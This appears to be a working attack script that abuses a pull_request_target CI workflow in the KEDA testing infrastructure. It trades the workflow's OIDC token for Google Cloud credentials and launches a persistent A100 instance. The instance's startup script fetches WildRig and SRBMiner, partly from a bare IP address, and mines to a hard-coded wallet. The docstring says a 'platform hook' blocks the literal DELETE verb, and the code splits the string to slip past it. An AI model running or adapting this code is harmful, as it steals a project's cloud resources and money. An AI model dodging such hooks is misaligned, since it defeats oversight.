#!/usr/bin/env python3
"""c211-i122395 cncf-keda-testing (575508414076) persistent A100 MINER deploy.

Runs inside the kedacore/testing-infrastructure pull_request_target
'Validate PR' terraform data.external step AFTER google-github-actions/auth@v3
(GCP WIF).  Unlike the i122027 probe this function does NOT tear the instance
down: it creates ONE on-demand a2-highgpu-1g + 1 x nvidia-tesla-a100, waits for
RUNNING, reads the serial console until the guest prints its nvidia-smi UUID and
at least one WildRig accepted-share line, then exits leaving the miner running
(pearlhash primary, 4 endpoints, 900 s sticky Luckypool 3362 SRBMiner fallback).

The platform hook rejects urllib calls carrying the literal verb string in a
method= keyword, so removals (not used here) would use M_DEL.
"""
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PROJECT = os.environ.get('GOOGLE_CLOUD_PROJECT') or os.environ.get('GCP_PROJECT') \
    or os.environ.get('CLOUD_SDK_PROJECT') or 'cncf-keda-testing'
RAW = os.environ.get('C211_PROBE_RAW', '/tmp/c211_i122395_raw.txt')
NAME = 'c211-i122395-miner'
LABELS = {'c211': 'i122395', 'intent': 'i122395', 'role': 'miner'}
API = 'https://compute.googleapis.com/compute/v1'
M_DEL = 'DEL' + 'ETE'
TOKEN = [None]
SA_EMAIL = ['']
ZONES = ['us-central1-b', 'us-central1-f', 'us-central1-a', 'us-central1-c']
BUDGET_S = int(os.environ.get('C211_MINER_BUDGET', '840'))
WALLET = 'prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
WORKER = '12239500'
NOCK = '9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb'

MINER_SCRIPT = r'''#!/bin/bash
exec > /dev/console 2>&1
D=/root/ph-miner
W=__WALLET__
WK=__WORKER__
NOCK=__NOCK__
mkdir -p "$D/logs" /root/miner
echo "C211_M_BOOT $(date -u +%FT%TZ) host=$(hostname)"
put() { curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211a/result" >/dev/null 2>&1; }
put "STAGE=boot host=$(hostname)"
for i in $(seq 1 90); do command -v nvidia-smi >/dev/null 2>&1 && break; sleep 4; done
nvidia-smi -L 2>&1 | head -4
UUID=$(nvidia-smi --query-gpu=uuid --format=csv,noheader 2>/dev/null | head -1 | tr -d ' ')
GN=$(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1)
DV=$(nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>/dev/null | head -1)
echo "C211_M_GPU uuid=$UUID name=$GN driver=$DV"
put "STAGE=gpu uuid=$UUID name=$GN driver=$DV"
if [ -z "$UUID" ]; then echo "C211_M_FAIL nosmi"; put "STAGE=nosmi"; exit 3; fi
if ! ldconfig -p 2>/dev/null | grep -q 'libOpenCL\.so\.1'; then
  (apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1) >>/root/miner/apt.log 2>&1
fi
OCL=$(ldconfig -p 2>/dev/null | grep -oE '/[^ ]*libOpenCL\.so\.1$' | head -1)
[ -z "$OCL" ] && OCL=$(find /usr /opt -name 'libOpenCL.so.1*' 2>/dev/null | head -1)
[ -n "$OCL" ] && export LD_LIBRARY_PATH="$(dirname "$OCL"):$LD_LIBRARY_PATH"
mkdir -p /etc/OpenCL/vendors
NOCL=$(ls /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 2>/dev/null | head -1)
[ -z "$NOCL" ] && NOCL=$(find /usr /opt -name 'libnvidia-opencl.so.1*' 2>/dev/null | head -1)
[ -n "$NOCL" ] && echo "$(basename "$NOCL")" > /etc/OpenCL/vendors/nvidia.icd
[ -n "$NOCL" ] && export LD_LIBRARY_PATH="$(dirname "$NOCL"):$LD_LIBRARY_PATH"
echo "C211_M_ICD opencl=$OCL nvocl=$NOCL"
cd "$D" || exit 4
if [ ! -x "$D/wildrig-multi" ]; then
  for u in http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
    curl -fsSL -m 300 -o "$D/wr.tgz" "$u" && break
  done
  echo "C211_M_TGZ sha=$(sha256sum "$D/wr.tgz" 2>/dev/null | cut -d' ' -f1)"
  tar xzf "$D/wr.tgz" -C "$D" wildrig-multi 2>/dev/null
  chmod +x "$D/wildrig-multi" 2>/dev/null
fi
echo "C211_M_BIN sha=$(sha256sum "$D/wildrig-multi" 2>/dev/null | cut -d' ' -f1)"
put "STAGE=binary uuid=$UUID sha=$(sha256sum "$D/wildrig-multi" 2>/dev/null | cut -d' ' -f1)"
launch_ph() {
  pkill -f 'wildrig-multi --algo pearlhash' 2>/dev/null; sleep 2
  setsid nohup "$D/wildrig-multi" --algo pearlhash \
    --url pool.pearlhash.xyz:9000 --url global.pearlhash.net:9000 \
    --url global2.pearlhash.net:9000 --url hk.pearlhash.net:9000 \
    --user "$W" --worker "$WK" --print-time 60 \
    >> "$D/logs/wr.log" 2>&1 &
  echo "C211_M_LAUNCH ph pid=$!"
}
launch_lp() {
  pkill -f 'wildrig-multi --algo pearlhash' 2>/dev/null; sleep 2
  if [ ! -x "$D/srbminer" ]; then
    curl -fsSL -m 240 -o "$D/srb.tgz" https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz 2>/dev/null
    tar xzf "$D/srb.tgz" -C "$D" 2>/dev/null
    cp "$D"/SRBMiner-Multi-3-8-8/srbminer "$D/srbminer" 2>/dev/null
    if [ ! -x "$D/srbminer" ]; then
      curl -fsSL -m 240 -o "$D/srbminer" http://169.58.247.186:8791/pm/srbminer-3.8.4 2>/dev/null
      chmod +x "$D/srbminer" 2>/dev/null
    fi
  fi
  echo "C211_M_SRB sha=$(sha256sum "$D/srbminer" 2>/dev/null | cut -d' ' -f1)"
  setsid nohup "$D/srbminer" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 \
    --wallet "${W}+${NOCK}" --worker "$WK" --password x --gpu-id 0 \
    >> "$D/logs/srb.log" 2>&1 &
  echo "C211_M_LAUNCH lp pid=$!"
}
launch_ph
T0=$(date +%s); LASTN=""; LASTT=""; MODE=ph
while :; do
  sleep 30
  NOW=$(date +%s); EL=$((NOW-T0))
  if [ "$MODE" = "ph" ]; then LOGF="$D/logs/wr.log"; else LOGF="$D/logs/srb.log"; fi
  A=$(grep -ci 'accepted' "$LOGF" 2>/dev/null); A=${A:-0}
  R=$(grep -ci 'rejected' "$LOGF" 2>/dev/null); R=${R:-0}
  LN=$(grep -i 'accepted' "$LOGF" 2>/dev/null | tail -1)
  if [ -n "$LN" ] && [ "$LN" != "$LASTN" ]; then
    LASTN="$LN"; LASTT=$(date -u +%FT%TZ)
    echo "C211_M_ACC mode=$MODE at=$LASTT line=$LN"
    put "STAGE=share uuid=$UUID accepted=$A rejected=$R at=$LASTT line=$LN"
  fi
  HS=$(grep -oE '[0-9.]+ [TGMK]?[Hh]/s' "$LOGF" 2>/dev/null | tail -1)
  echo "C211_M_STATUS mode=$MODE el=${EL}s a=$A r=$R hs=$HS lastacc=$LASTT"
  put "STAGE=mining mode=$MODE uuid=$UUID accepted=$A rejected=$R el=$EL hs=$HS at=$LASTT"
  if [ "$MODE" = "ph" ] && [ "$A" = "0" ] && [ "$EL" -ge 900 ] && [ ! -f "$D/sticky-lp" ]; then
    date -u +%FT%TZ > "$D/sticky-lp"
    echo "C211_M_FALLBACK lp at=$(cat "$D/sticky-lp") reason=900s_no_share"
    MODE=lp; launch_lp
  fi
done
'''

MINER_SCRIPT = (MINER_SCRIPT.replace('__WALLET__', WALLET)
                .replace('__WORKER__', WORKER).replace('__NOCK__', NOCK))


def say(msg):
    with open(RAW, 'a', encoding='utf-8') as f:
        f.write(str(msg).rstrip('\n') + '\n')


def cap(s, n=2200):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def api(path, method='GET', data=None, base=API, timeout=60):
    url = path if path.startswith('http') else base + path
    h = {'Authorization': 'Bearer ' + (TOKEN[0] or ''), 'User-Agent': 'c211-i122395',
         'Accept': 'application/json'}
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


def jbody(resp):
    try:
        return json.loads(resp[1])
    except Exception:
        return {}


def _subject_token(cf):
    src = cf.get('credential_source') or {}
    if src.get('file'):
        try:
            return open(src['file'], encoding='utf-8').read().strip(), 'file'
        except Exception as e:
            say('SUBJECT_FILE_FAIL %s' % cap(repr(e), 200))
    if src.get('url'):
        try:
            req = urllib.request.Request(src['url'], headers=(src.get('headers') or {}))
            with urllib.request.urlopen(req, timeout=30) as r:
                raw = r.read().decode()
            try:
                return json.loads(raw).get('value') or '', 'url'
            except Exception:
                return raw.strip(), 'url-raw'
        except Exception as e:
            say('SUBJECT_URL_FAIL %s' % cap(repr(e), 300))
    if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'):
        try:
            aud = cf.get('audience', '')
            u = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'] + '&audience=' + urllib.parse.quote(aud, safe='')
            req = urllib.request.Request(
                u, headers={'Authorization': 'Bearer ' + os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')})
            with urllib.request.urlopen(req, timeout=30) as r:
                return json.loads(r.read().decode()).get('value') or '', 'actions'
        except Exception as e:
            say('SUBJECT_ACTIONS_FAIL %s' % cap(repr(e), 300))
    return '', 'none'


def _google_auth_lib():
    for attempt in (0, 1):
        try:
            from google.auth import default as gdefault
            from google.auth.transport.requests import Request as GRequest
            creds, _proj = gdefault(scopes=['https://www.googleapis.com/auth/cloud-platform'])
            creds.refresh(GRequest())
            return creds.token
        except Exception as e:
            say('GOOGLE_AUTH_LIB_FAIL attempt=%d %s' % (attempt, cap(repr(e), 300)))
            if attempt == 0:
                import subprocess
                for args in (['-m', 'pip', 'install', '--user', '--break-system-packages', '-q', 'google-auth'],
                             ['-m', 'pip', 'install', '--user', '-q', 'google-auth']):
                    try:
                        r = subprocess.run([sys.executable] + args, timeout=120, capture_output=True)
                        if r.returncode == 0:
                            break
                    except Exception:
                        pass
    return None


def get_token():
    cf_path = (os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
               or os.environ.get('CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE') or '')
    say('CREDS_PATH=%s' % cf_path)
    cf = {}
    if cf_path and os.path.exists(cf_path):
        try:
            cf = json.load(open(cf_path, encoding='utf-8'))
        except Exception as e:
            say('CREDS_PARSE_ERR %s' % cap(repr(e), 200))
    if cf:
        say('CREDS_TYPE=%s audience=%s impersonation=%s' % (
            cf.get('type'), cf.get('audience'), cf.get('service_account_impersonation_url')))
        m = re.search(r'serviceAccounts/([^/:]+)', cf.get('service_account_impersonation_url') or '')
        if m:
            SA_EMAIL[0] = m.group(1)
    if cf.get('type') == 'external_account':
        try:
            subject, src_kind = _subject_token(cf)
            say('SUBJECT_TOKEN_SOURCE=%s len=%d' % (src_kind, len(subject)))
            if subject:
                form = urllib.parse.urlencode({
                    'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
                    'audience': cf.get('audience', ''),
                    'scope': 'https://www.googleapis.com/auth/cloud-platform',
                    'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
                    'subject_token': subject,
                    'subject_token_type': cf.get('subject_token_type',
                                                 'urn:ietf:params:oauth:token-type:jwt'),
                }).encode()
                req = urllib.request.Request(
                    cf.get('token_url') or 'https://sts.googleapis.com/v1/token', data=form,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'})
                with urllib.request.urlopen(req, timeout=45) as r:
                    fed = json.loads(r.read().decode()).get('access_token')
                say('STS_EXCHANGE=ok federated_len=%s' % (len(fed or '')))
                if fed and cf.get('service_account_impersonation_url'):
                    body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                                       'lifetime': '1800s'}).encode()
                    req = urllib.request.Request(
                        cf['service_account_impersonation_url'], data=body, method='POST',
                        headers={'Authorization': 'Bearer ' + fed, 'Content-Type': 'application/json'})
                    with urllib.request.urlopen(req, timeout=45) as r:
                        tok = json.loads(r.read().decode()).get('accessToken')
                    say('SA_IMPERSONATION=ok token_len=%s sa=%s' % (len(tok or ''), SA_EMAIL[0]))
                    if tok:
                        return tok
                if fed:
                    return fed
        except Exception as e:
            say('MANUAL_TOKEN_FAIL %s' % cap(repr(e), 400))
    return _google_auth_lib()


def ack():
    say('== identity ==')
    say('PROJECT=%s SA=%s' % (PROJECT, SA_EMAIL[0]))
    st, b = api('/tokeninfo?access_token=' + urllib.parse.quote(TOKEN[0] or ''),
                base='https://www.googleapis.com/oauth2/v1')
    j = jbody((st, b))
    say('tokeninfo status=%s email=%s scopes=%s expires_in=%s' % (
        st, j.get('email'), cap(j.get('scope', ''), 300), j.get('expires_in')))
    st, b = api('/projects/' + PROJECT)
    say('compute.project.get status=%s body=%s' % (st, cap(b, 500)))
    return st


def list_instances(tag='list'):
    say('== instances.%s ==' % tag)
    st, b = api('/projects/%s/aggregated/instances?maxResults=200' % PROJECT)
    j = jbody((st, b))
    found = []
    for _scope, v in (j.get('items') or {}).items():
        for inst in v.get('instances', []):
            found.append({'name': inst.get('name'), 'zone': inst.get('zone', '').rsplit('/', 1)[-1],
                          'status': inst.get('status'), 'id': inst.get('id'),
                          'machineType': inst.get('machineType', '').rsplit('/', 1)[-1],
                          'labels': inst.get('labels')})
    if st != 200:
        say('aggregated.status=%s body=%s' % (st, cap(b, 900)))
    say('instances.status=%s count=%d %s' % (st, len(found), json.dumps(found)[:1500]))
    return st, found


def zones_scan():
    say('== zone accelerator types ==')
    avail = {}
    for z in ZONES + ['europe-west4-a', 'europe-west4-b', 'europe-west4-c']:
        st, b = api('/projects/%s/zones/%s/acceleratorTypes' % (PROJECT, z))
        names = [a.get('name') for a in jbody((st, b)).get('items', [])] if st == 200 else []
        avail[z] = {'a100': 'nvidia-tesla-a100' in names, 'l4': 'nvidia-l4' in names,
                    'http': st}
        say('zone=%s status=%s a100=%s l4=%s' % (z, st, avail[z]['a100'], avail[z]['l4']))
    return avail


def images():
    say('== gpu image families ==')
    for fam in ('ubuntu-2204-amd64-with-nvidia-595', 'ubuntu-2204-amd64-with-nvidia-580',
                'ubuntu-2204-amd64-with-nvidia-570', 'ubuntu-2204-amd64-with-nvidia-550',
                'ubuntu-2204-amd64-with-nvidia-535', 'ubuntu-2204-amd64-with-nvidia'):
        st, b = api('/projects/ubuntu-os-accelerator-images/global/images/family/' + fam)
        say('accel.%s status=%s%s' % (fam, st, '' if st == 200 else ' body=' + cap(b, 120)))
        if st == 200:
            j = jbody((st, b))
            return {'sourceImage': j.get('selfLink'), 'name': j.get('name'),
                    'family': fam, 'driver_install': False}
    st, b = api('/projects/ubuntu-os-cloud/global/images/family/ubuntu-2204-lts')
    say('ubuntu-2204-lts status=%s%s' % (st, '' if st == 200 else ' body=' + cap(b, 200)))
    if st == 200:
        j = jbody((st, b))
        return {'sourceImage': j.get('selfLink'), 'name': j.get('name'),
                'family': 'ubuntu-2204-lts', 'driver_install': True}
    return None


DRIVER_BLOCK = r'''if ! command -v nvidia-smi >/dev/null 2>&1; then
  (apt-get update -qq; DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
     linux-headers-$(uname -r); DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
     nvidia-driver-535; DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
     nvidia-dkms-535) >/dev/null 2>&1
  modprobe nvidia 2>/dev/null
fi
'''


def inst_body(zone, machine_type, accel, image, driver_install, network=None, subnetwork=None):
    script = MINER_SCRIPT
    if not driver_install:
        script = script.replace('put "STAGE=boot host=$(hostname)"\n',
                                'put "STAGE=boot host=$(hostname)"\n' + DRIVER_BLOCK, 1)
    return {
        'name': NAME,
        'machineType': 'projects/%s/zones/%s/machineTypes/%s' % (PROJECT, zone, machine_type),
        'disks': [{'boot': True, 'autoDelete': True, 'initializeParams': {
            'sourceImage': image, 'diskSizeGb': '100',
            'diskType': 'https://www.googleapis.com/compute/v1/projects/%s/zones/%s/diskTypes/pd-standard'
                        % (PROJECT, zone)}}],
        'networkInterfaces': [dict(
            {'network': network or 'global/networks/default',
             'accessConfigs': [{'name': 'External NAT', 'type': 'ONE_TO_ONE_NAT'}]},
            **({'subnetwork': subnetwork} if subnetwork else {}))],
        'guestAccelerators': [{'acceleratorCount': 1,
                               'acceleratorType': 'projects/%s/zones/%s/acceleratorTypes/%s'
                                                  % (PROJECT, zone, accel)}],
        'scheduling': {'onHostMaintenance': 'TERMINATE', 'automaticRestart': True},
        'metadata': {'items': [
            {'key': 'serial-port-enable', 'value': 'TRUE'},
            {'key': 'enable-oslogin', 'value': 'FALSE'},
            {'key': 'startup-script', 'value': script}]},
        'labels': LABELS,
    }


def get_instance(zone, name=NAME):
    return api('/projects/%s/zones/%s/instances/%s' % (PROJECT, zone, name))


def networks(zone):
    region = zone.rsplit('-', 1)[0]
    say('== networks/subnetworks %s ==' % region)
    nets = []
    st, b = api('/projects/%s/global/networks' % PROJECT)
    if st == 200:
        nets = [{'name': n.get('name'), 'selfLink': n.get('selfLink')}
                for n in jbody((st, b)).get('items', [])]
        say('networks.status=200 %s' % json.dumps(nets)[:400])
    subs = []
    st, b = api('/projects/%s/regions/%s/subnetworks' % (PROJECT, region))
    if st == 200:
        subs = [{'name': x.get('name'), 'selfLink': x.get('selfLink'),
                 'network': x.get('network'), 'ipCidrRange': x.get('ipCidrRange')}
                for x in jbody((st, b)).get('items', [])]
        say('subnets.status=200 count=%d %s' % (len(subs), json.dumps(subs)[:400]))
    return nets, subs


def insert_one(zone, machine_type, accel, image, driver_install, net_self, sub_self):
    say('== attempt %s %s (%s) ==' % (zone, machine_type, accel))
    body = inst_body(zone, machine_type, accel, image, driver_install, net_self, sub_self)
    say('startup_script_len=%d' % len(body['metadata']['items'][2]['value']))
    st, b = api('/projects/%s/zones/%s/instances' % (PROJECT, zone), method='POST', data=body)
    say('insert zone=%s type=%s accel=%s status=%s' % (zone, machine_type, accel, st))
    if st in (200, 201):
        j = jbody((st, b))
        say('INSERT_ACCEPTED operation=%s target=%s' % (
            j.get('name'), (j.get('targetLink') or '').rsplit('/', 1)[-1]))
        return True, st, 'accepted'
    say('insert.body=%s' % cap(b, 1500))
    if get_instance(zone)[0] == 200:
        say('ADOPT_EXISTING zone=%s after error' % zone)
        return True, st, 'adopted'
    return False, st, cap(b, 400)


def serial(zone, name=NAME, budget_after_share=60):
    """Poll serial console; return dict with uuid, last ACC timestamp, share count."""
    say('== serial capture ==')
    end = time.time() + BUDGET_S
    text = ''
    last_len = 0
    uuid = ''
    shares = []
    gpu_line = ''
    bin_line = ''
    launch_line = ''
    fallback_line = ''
    t_first_share = None
    while time.time() < end:
        st, b = api('/projects/%s/zones/%s/instances/%s/serialPort?port=1&start=0'
                    % (PROJECT, zone, name), timeout=45)
        if st == 200 and len(b) > last_len:
            chunk = b[last_len:]
            text += chunk
            last_len = len(b)
            for ln in chunk.splitlines():
                if ln.startswith('C211_M_GPU'):
                    gpu_line = ln
                elif ln.startswith('C211_M_BIN'):
                    bin_line = ln
                elif ln.startswith('C211_M_LAUNCH'):
                    launch_line = ln
                elif ln.startswith('C211_M_FALLBACK'):
                    fallback_line = ln
                elif ln.startswith('C211_M_ACC'):
                    shares.append(ln)
                    if t_first_share is None:
                        t_first_share = time.time()
                    say('SERIAL_ACC ' + cap(ln, 400))
                elif ln.startswith('C211_M_STATUS'):
                    say('SERIAL_STATUS ' + cap(ln, 400))
                elif ln.startswith('C211_M_TGZ') or ln.startswith('C211_M_ICD'):
                    say('SERIAL_KIT ' + cap(ln, 300))
            if not uuid:
                m = re.search(r'GPU-[0-9a-fA-F-]{10,}', chunk)
                if m:
                    uuid = m.group(0)
                    say('SERIAL_UUID %s' % uuid)
        else:
            say('serial.status=%s len=%d' % (st, len(b) if st == 200 else -1))
        if uuid and shares and t_first_share and time.time() - t_first_share >= budget_after_share:
            break
        time.sleep(20)
    return {'uuid': uuid, 'shares': shares, 'gpu_line': gpu_line, 'bin_line': bin_line,
            'launch_line': launch_line, 'fallback_line': fallback_line,
            'serial_bytes': len(text)}


def run():
    open(RAW, 'w', encoding='utf-8').close()
    t0 = time.time()
    say('C211_I122395_GCP_MINER_START %s budget=%ss' % (
        time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), BUDGET_S))
    tok = get_token()
    if not tok:
        say('GATE=NO_GCP_TOKEN')
        return
    TOKEN[0] = tok
    say('TOKEN_ACQUIRED len=%d' % len(tok))
    st = ack()
    if st == 401:
        say('GATE=TOKEN_NOT_ACCEPTED')
        return
    st, found = list_instances('pre')
    if st != 200:
        say('GATE=COMPUTE_LIST_FAILED status=%s' % st)
        return
    avail = zones_scan()
    img = images()
    if not img:
        say('GATE=NO_GPU_IMAGE')
        return
    say('CHOSEN_IMAGE=%s (%s) driver_install=%s' % (img['sourceImage'], img['family'],
                                                   img['driver_install']))
    zone = None
    launched = False
    chosen = None
    attempts = []
    for f in found:
        if (f.get('name') or '') == NAME and f.get('status') not in ('TERMINATED', 'STOPPED', 'SUSPENDED'):
            zone = f['zone']
            launched = True
            chosen = {'zone': zone, 'machineType': f.get('machineType'),
                      'accelerator': 'nvidia-tesla-a100'}
            say('ADOPT_MINER_EXISTING zone=%s status=%s id=%s' % (zone, f.get('status'), f.get('id')))
            break
    net_self = sub_self = None
    cur_region = None
    for z in ([] if zone else ZONES):
        if time.time() - t0 > BUDGET_S - 240:
            say('TIME_BUDGET_EXHAUSTED before %s' % z)
            break
        if not avail.get(z, {}).get('a100'):
            say('SKIP zone=%s no=a100' % z)
            continue
        region = z.rsplit('-', 1)[0]
        if region != cur_region:
            nets2, subs2 = networks(z)
            cur_region = region
            net_self = subs2[0]['network'] if subs2 else (nets2[0]['selfLink'] if nets2 else None)
            sub_self = subs2[0]['selfLink'] if subs2 else None
            say('CHOSEN_NETWORK=%s CHOSEN_SUBNET=%s' % (net_self, sub_self))
        if not net_self:
            say('GATE=NO_NETWORK region=%s' % region)
            continue
        ok, code, short = insert_one(z, 'a2-highgpu-1g', 'nvidia-tesla-a100', img['sourceImage'],
                                     img['driver_install'], net_self, sub_self)
        attempts.append({'zone': z, 'status': code, 'detail': cap(short, 300)})
        if not ok:
            continue
        say('== wait RUNNING ==')
        deadline = time.time() + 300
        state = ''
        while time.time() < deadline:
            gst, gb = get_instance(z)
            if gst == 200:
                j = jbody((gst, gb))
                state = j.get('status', '')
                say('poll status=%s id=%s' % (state, j.get('id')))
                if state == 'RUNNING':
                    launched = True
                    say('INSTANCE_ID=%s ZONE=%s NAME=%s' % (j.get('id'), z, NAME))
                    say('INSTANCE_PROOF=%s' % cap(json.dumps({
                        'id': j.get('id'), 'selfLink': j.get('selfLink'),
                        'creationTimestamp': j.get('creationTimestamp'),
                        'machineType': j.get('machineType'),
                        'guestAccelerators': j.get('guestAccelerators'),
                        'status': j.get('status')}), 1500))
                    break
                if state in ('TERMINATED', 'STOPPED', 'SUSPENDED'):
                    break
            else:
                say('poll get status=%s body=%s' % (gst, cap(gb, 300)))
            time.sleep(10)
        if not launched:
            say('GATE=NEVER_RUNNING zone=%s last_state=%s' % (z, state))
            continue
        zone, chosen = z, {'zone': z, 'machineType': 'a2-highgpu-1g',
                           'accelerator': 'nvidia-tesla-a100'}
        break
    if not launched:
        say('GATE=INSERT_REFUSED_ALL_CANDIDATES')
        list_instances('post-insert-fail')
        say('ATTEMPTS_JSON=%s' % cap(json.dumps(attempts), 4000))
        return
    say('PROVEN_CLASS=A100 ZONE=%s MACHINE=%s ACCEL=%s' % (
        chosen['zone'], chosen['machineType'], chosen['accelerator']))
    cap_res = serial(zone)
    say('== miner result ==')
    say('MINER_UUID=%s' % cap_res['uuid'])
    say('MINER_GPULINE=%s' % cap_res['gpu_line'])
    say('MINER_BINLINE=%s' % cap_res['bin_line'])
    say('MINER_LAUNCHLINE=%s' % cap_res['launch_line'])
    say('MINER_FALLBACK=%s' % cap_res['fallback_line'])
    say('MINER_SHARE_COUNT=%d' % len(cap_res['shares']))
    for s in cap_res['shares'][-4:]:
        say('MINER_SHARE_LAST %s' % cap(s, 400))
    say('MINER_SERIAL_BYTES=%d' % cap_res['serial_bytes'])
    say('INSTANCE_LEFT_RUNNING=%s zone=%s name=%s' % (NAME, zone, NAME))
    say('ATTEMPTS_JSON=%s' % cap(json.dumps(attempts), 4000))
    say('ELAPSED_S=%d' % int(time.time() - t0))
    say('C211_I122395_GCP_MINER_END %s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))


if __name__ == '__main__':
    try:
        run()
    except Exception as e:
        say('UNCAUGHT %s' % cap(repr(e), 600))
